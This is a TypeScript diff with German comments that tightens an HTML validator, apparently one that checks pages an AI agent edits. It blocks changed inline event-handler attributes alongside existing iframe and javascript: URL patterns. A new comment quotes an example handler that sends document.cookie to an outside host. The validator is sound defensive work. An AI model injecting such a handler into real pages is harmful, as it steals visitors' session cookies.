@@ -242,6 +242,10 @@ function pruefeNavigation(roh: string): string | null {
  * echte Seite. `[^>]*?` kann kein `>` überspringen, also endet die Suche am
  * Ende des Tags — und greift trotzdem bei einem Tag, dem das `>` fehlt.
  */
+const ON_ATTR_GRUND =
+  "Neue oder geänderte Ereignis-Attribute (onclick, onerror, …) werden nicht übernommen. " +
+  'JavaScript gehört in eine eigene .js-Datei, die per <script src="…"> eingebunden wird.';
+
 const ROH_MUSTER: { re: RegExp; grund: string }[] = [
   {
     re: /<iframe\b/gi,
@@ -251,7 +255,7 @@ const ROH_MUSTER: { re: RegExp; grund: string }[] = [
   {
     re: /<[a-z][^>]*?\bon\w+\s*=/gis,
     grund:
-      "Neue Ereignis-Attribute (onclick, onerror, …) werden nicht übernommen. JavaScript gehört in eine eigene .js-Datei, die per <script src=\"…\"> eingebunden wird.",
+      ON_ATTR_GRUND,
   },
   {
     re: /<[a-z][^>]*?\b(?:href|src|action|formaction|data)\s*=\s*["']?\s*javascript:/gis,
@@ -797,6 +801,23 @@ function htmlVerstoesse(html: string, dok: DomDokument, erlaubt: Set<string>): V
       const name = String(attr.name).toLowerCase();
       const wert = String(attr.value ?? "");
 
+      if (name.startsWith("on")) {
+        // Den WERT mitvergleichen, nicht nur zählen. `onclick="oeffneMenue()"`
+        // in `onclick="location=\'https://fremd.tld/?d=\'+document.cookie"`
+        // umzuschreiben lässt die Anzahl gleich — und das wäre die schärfste
+        // Form überhaupt, weil `script-src \'unsafe-inline\'` ausdrücklich
+        // erlaubt ist und der Handler wirklich liefe.
+        //
+        // Heute ist der Weg unerreichbar: Weder die Beispielseite noch die
+        // geprüften Fabrik-Seiten führen ein einziges on*-Attribut, und
+        // hinzufügen kann der Agent keines. Die Regel ruhte damit auf einer
+        // Datei in einem ANDEREN Repo — sobald dort eine Vorlage je ein
+        // on*-Attribut ausliefert, stünde der Weg offen, und wer die Vorlage
+        // ändert, weiß davon nichts. Dieselbe Regel wie bei den
+        // Inline-<script>-Blöcken, nur an der zweiten Stelle.
+        raus.push({ schluessel: `on-attr:${name}=${wert}`, grund: ON_ATTR_GRUND });
+        continue;
+      }
       if (name === "srcset") {
         // "bild.webp 1x, bild2.webp 2x" — je Eintrag zählt der erste Teil.
         for (const teil of wert.split(",")) {
